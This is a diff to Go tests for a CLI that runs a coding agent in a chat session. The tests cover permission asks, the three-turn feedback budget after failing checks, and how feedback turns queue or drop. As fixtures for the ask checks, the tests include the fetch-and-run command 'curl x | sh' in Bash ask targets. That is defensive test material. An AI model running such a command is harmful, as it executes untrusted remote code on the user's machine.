@@ -4,6 +4,7 @@ package cli
 
 import (
 	"encoding/json"
+	"fmt"
 	"os"
 	"path/filepath"
 	"strconv"
@@ -116,6 +117,7 @@ func TestHomeChatAsksFailsAndParks(t *testing.T) {
 	long := strings.Repeat("echo line\n", agent.AskMaxLines) + "curl x | sh"
 	s, f := startChatSession(t, multiturn.Scenario{Turns: []multiturn.Turn{
 		{Reply: "asked", Ask: &multiturn.Ask{Tool: "Bash", Target: "touch b.go"}, Writes: []multiturn.File{{Path: "b.go", Content: "package fx\n"}}},
+		{Reply: "looking at it"}, // the failing cut's feedback turn
 		{Reply: "two lines", Ask: &multiturn.Ask{Tool: "Bash", Target: "echo ok\ncurl x | sh"}},
 		{Reply: "too long", Ask: &multiturn.Ask{Tool: "Bash", Target: long}},
 		{Reply: "tampered", Writes: []multiturn.File{{Path: "add.go", Content: "package fx\n\nfunc Add(a, b int) int { return a + b }\n"}, {Path: "add_test.go", Content: "package fx\n"}}},
@@ -126,7 +128,7 @@ func TestHomeChatAsksFailsAndParks(t *testing.T) {
 	s.type_("y")
 	s.expect("allowed: Bash touch b.go")
 	s.expect("oge › ✗ Failed · 1 file")
-	s.composer()
+	s.expectAfter("  looking at it", "[ctrl+e] editor")
 	s.type_("/apply\r")
 	s.expect("ended Failed")
 	if _, err := os.Stat(filepath.Join(f.repo, "b.go")); err == nil {
@@ -151,6 +153,104 @@ func TestHomeChatAsksFailsAndParks(t *testing.T) {
 	s.expect("reverted add_test.go")
 	s.expect("oge › … Waiting for you")
 	s.composer()
+	s.quitChat(f)
+}
+
+// expectAfter waits until text is written after the last anchor: a
+// composer the feedback turn's end shows, not the one before it began.
+func (s *homeSession) expectAfter(anchor, text string) {
+	s.t.Helper()
+	for deadline := time.Now().Add(90 * time.Second); time.Now().Before(deadline); time.Sleep(5 * time.Millisecond) {
+		out := s.out.String()
+		if i := strings.LastIndex(out, anchor); i >= 0 && strings.Contains(out[i:], text) {
+			return
+		}
+	}
+	s.t.Fatalf("%q never appeared after %q in:\n%s", text, anchor, s.out.String())
+}
+
+// addGo is the fixture's add.go returning r, a failing Add unless r is
+// a + b.
+func addGo(r string) multiturn.File {
+	return multiturn.File{Path: "add.go", Content: "package fx\n\nfunc Add(a, b int) int { return " + r + " }\n"}
+}
+
+// A failing cut sends a dim feedback turn into the Session (D5); its
+// change cuts as usual, and passes.
+func TestHomeChatFeedbackTurn(t *testing.T) {
+	t.Parallel()
+	s, f := startChatSession(t, multiturn.Scenario{Turns: []multiturn.Turn{
+		{Reply: "changed Add", Writes: []multiturn.File{addGo("a - b")}},
+		{Reply: "fixed Add", Writes: []multiturn.File{addGo("a + b")}},
+	}}, nil)
+	s.composer()
+	s.type_("change Add\r")
+	s.expect("oge › ✗ Failed · 1 file")
+	s.expect("Öge → agent: Öge's Check failed on your last change")
+	s.expect("  fixed Add")
+	s.expect("oge › ✓ Accepted · 1 file · ")
+	s.quitChat(f)
+}
+
+// The chain gets 3 feedback turns; a 4th failing cut is the human's call.
+func TestHomeChatFeedbackBudget(t *testing.T) {
+	t.Parallel()
+	var turns []multiturn.Turn
+	for i := range 4 {
+		turns = append(turns, multiturn.Turn{Reply: fmt.Sprintf("try %d", i), Writes: []multiturn.File{addGo(fmt.Sprintf("a - b - %d", i))}})
+	}
+	s, f := startChatSession(t, multiturn.Scenario{Turns: turns}, nil)
+	s.composer()
+	s.type_("change Add\r")
+	for i := 1; i <= 3; i++ {
+		s.expect(fmt.Sprintf("  try %d", i))
+	}
+	// A 4th feedback turn would find no turn left to serve it.
+	s.expectAfter("  try 3", "oge › ✗ still failing after 3 tries; your call")
+	s.quitChat(f)
+}
+
+// A feedback turn waits for the user's turn in flight, and goes after it
+// when that turn cut nothing; one that cut anew drops it (D5).
+func TestHomeChatFeedbackQueuesAndDrops(t *testing.T) {
+	t.Parallel()
+	s, f := startChatSession(t, multiturn.Scenario{Turns: []multiturn.Turn{
+		{Reply: "changed Add", Writes: []multiturn.File{addGo("a - b")}},
+		{Reply: "asked", Ask: &multiturn.Ask{Tool: "Bash", Target: "touch c.go"}},
+		{Reply: "on it"}, // the feedback turn, after the user's turn
+		{Reply: "changed Add again", Writes: []multiturn.File{addGo("a * b")}},
+		{Reply: "asked again", Ask: &multiturn.Ask{Tool: "Bash", Target: "touch d.go"}, Writes: []multiturn.File{addGo("a / b")}},
+		{Reply: "after the newer cut"}, // its feedback turn; the older one was dropped
+	}}, nil)
+	s.composer()
+	s.type_("change Add\r")
+	s.expect("  changed Add")
+	s.composer()
+	s.type_("vet it\r")
+	s.expect("Allow Bash?")
+	s.expect("oge › ✗ Failed · 1 file") // the first cut fails while this turn waits
+	if out := s.out.String(); strings.Contains(out, "Öge → agent") {
+		t.Fatalf("the feedback entered a running turn:\n%s", out)
+	}
+	s.type_("n")
+	s.expect("denied: Bash touch c.go")
+	s.expect("Öge → agent: Öge's Check failed on your last change")
+	s.expectAfter("  on it", "[ctrl+e] editor")
+
+	s.type_("change it again\r")
+	s.expect("  changed Add again")
+	s.composer()
+	s.type_("fmt it\r")
+	s.expect("Allow Bash?")
+	s.expect("oge › ✗ Failed · 1 file") // its feedback waits, then is dropped
+	s.type_("y")
+	s.expect("allowed: Bash touch d.go")
+	s.expectAfter("  after the newer cut", "[ctrl+e] editor")
+	out := s.out.String()
+	from := strings.LastIndex(out, "allowed: Bash touch d.go")
+	if n := strings.Count(out[from:strings.LastIndex(out, "  after the newer cut")], "Öge → agent"); n != 1 {
+		t.Errorf("%d feedback turns after the newer cut, want 1:\n%s", n, out[from:])
+	}
 	s.quitChat(f)
 }
 
